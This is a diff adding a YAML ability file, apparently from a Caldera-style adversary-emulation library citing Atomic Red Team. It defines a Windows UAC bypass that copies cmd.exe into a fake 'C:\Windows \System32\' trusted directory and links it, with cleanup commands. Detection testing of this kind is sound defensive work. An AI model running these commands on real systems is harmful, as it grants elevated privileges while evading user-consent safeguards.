@@ -1,0 +1,39 @@
+- id: f7a35090-6f7f-4f64-bb47-d657bf5b10c1
+  name: Bypass UAC by Mocking Trusted Directories
+  description: 'Creates a fake "trusted directory" and copies a binary to bypass UAC.
+    The UAC bypass may not work on fully patched systems
+
+    Upon execution the directory structure should exist if the system is patched,
+    if unpatched Microsoft Management Console should launch'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1548.002
+    name: 'Abuse Elevation Control Mechanism: Bypass User Account Control'
+  platforms:
+    windows:
+      sh:
+        command: mkdir "\\?\C:\Windows \System32\"; copy "C:\Windows\System32\cmd.exe"
+          "\\?\C:\Windows \System32\mmc.exe"; mklink c:\testbypass.exe "\\?\C:\Windows
+          \System32\mmc.exe"
+        cleanup: rd "\\?\C:\Windows \" /S /Q >nul 2>nul; del "c:\testbypass.exe" >nul
+          2>nul
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1548.002
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      executable_binary:
+        description: Binary to execute with UAC Bypass
+        type: path
+        default: C:\Windows\System32\cmd.exe
+    technique_created: '2020-01-30T14:24:34.977Z'
+    atomic_guid: f7a35090-6f7f-4f64-bb47-d657bf5b10c1
+    import_timestamp: '2025-06-24T11:14:59.867507Z'
